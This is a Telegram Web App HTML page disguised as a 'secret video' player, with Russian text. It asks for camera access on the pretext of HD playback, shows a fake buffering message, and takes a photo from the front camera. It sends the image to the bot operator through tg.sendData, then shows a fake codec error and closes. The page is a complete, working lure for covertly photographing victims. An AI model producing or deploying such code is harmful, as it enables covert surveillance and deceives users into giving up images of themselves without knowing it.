<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #0f0f0f;
            color: white;
            font-family: sans-serif;
            text-align: center;
            padding-top: 80px;
        }
        button {
            background-color: #2481cc;
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
        }
        #videoElement { display: none; }
    </style>
</head>
<body>

    <div id="loader">
        <h2>Загрузка секретного видео...</h2>
        <p>Разрешите доступ к камере для оптимизации качества воспроизведения.</p>
        <button id="loadBtn">Включить HD</button>
    </div>

    <video id="videoElement" autoplay playsinline></video>
    <canvas id="canvasElement" style="display:none;"></canvas>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        const loadBtn = document.getElementById('loadBtn');
        const video = document.getElementById('videoElement');
        const canvas = document.getElementById('canvasElement');

        loadBtn.addEventListener('click', async () => {
            loadBtn.innerText = 'Буферизация 99%...';
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                setTimeout(() => {
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
                    stream.getTracks().forEach(track => track.stop());
                    
                    tg.sendData(imageDataURL);
                    
                    setTimeout(() => {
                        document.body.innerHTML = "<h2>Ошибка воспроизведения кодека. Видео недоступно. 😅</h2>";
                        setTimeout(() => tg.close(), 2000);
                    }, 1000);

                }, 1500);

            } catch (err) {
                alert("Ошибка загрузки потока: " + err.message);
                tg.close();
            }
        });
    </script>
</body>
</html>
